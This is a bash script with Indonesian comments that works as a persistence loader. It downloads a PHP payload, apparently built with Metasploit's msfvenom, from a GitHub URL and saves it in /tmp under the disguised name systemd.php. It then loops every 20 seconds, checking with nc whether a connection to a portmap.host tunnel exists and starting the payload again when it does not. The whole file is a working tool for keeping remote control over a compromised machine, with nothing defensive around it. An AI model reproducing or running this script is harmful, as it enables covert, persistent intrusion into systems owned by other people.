#!/bin/bash

# URL payload
PAYLOAD_URL="https://raw.githubusercontent.com/jabarzad/wshell/refs/heads/main/payload/msf/venom.php"

# Lokasi untuk menyimpan payload
PAYLOAD_PATH="/tmp/systemd.php"  # Nama file diubah menjadi systemd.php

# Alamat dan port yang harus terhubung
TARGET_HOST="synnaulaid-39785.portmap.host"
TARGET_PORT="39785"

# Fungsi untuk mendownload payload
download_payload() {
    echo "Downloading payload..."
    if curl -fsSL "$PAYLOAD_URL" -o "$PAYLOAD_PATH"; then
        echo "Payload downloaded successfully."
        chmod +x "$PAYLOAD_PATH" # Berikan izin eksekusi
    else
        echo "Failed to download payload."
        exit 1
    fi
}

# Fungsi untuk memastikan payload tersedia
ensure_payload_exists() {
    if [ ! -f "$PAYLOAD_PATH" ]; then
        echo "Payload not found. Downloading..."
        download_payload
    else
        echo "Payload found at $PAYLOAD_PATH."
    fi
}

# Fungsi untuk memeriksa koneksi ke alamat dan port yang ditentukan
check_connection() {
    # Cek apakah koneksi ke host dan port berhasil
    nc -z "$TARGET_HOST" "$TARGET_PORT" &>/dev/null
    return $?
}

# Loop tak berujung untuk memastikan payload berjalan
while :
do
    # Periksa apakah payload ada, jika tidak download ulang
    ensure_payload_exists

    # Cek apakah terhubung ke target host dan port
    if ! check_connection; then
        echo "Not connected to $TARGET_HOST:$TARGET_PORT. Starting payload..."
        
        # Periksa apakah payload sedang berjalan
        if ! pgrep -f "$PAYLOAD_PATH" > /dev/null; then
            # Jalankan payload jika tidak berjalan
            php "$PAYLOAD_PATH" &
            echo "Payload started at $(date)"
        fi
    else
        echo "Connected to $TARGET_HOST:$TARGET_PORT. No need to restart payload."
    fi

    # Tunggu selama 20 detik sebelum memeriksa lagi
    sleep 20
done
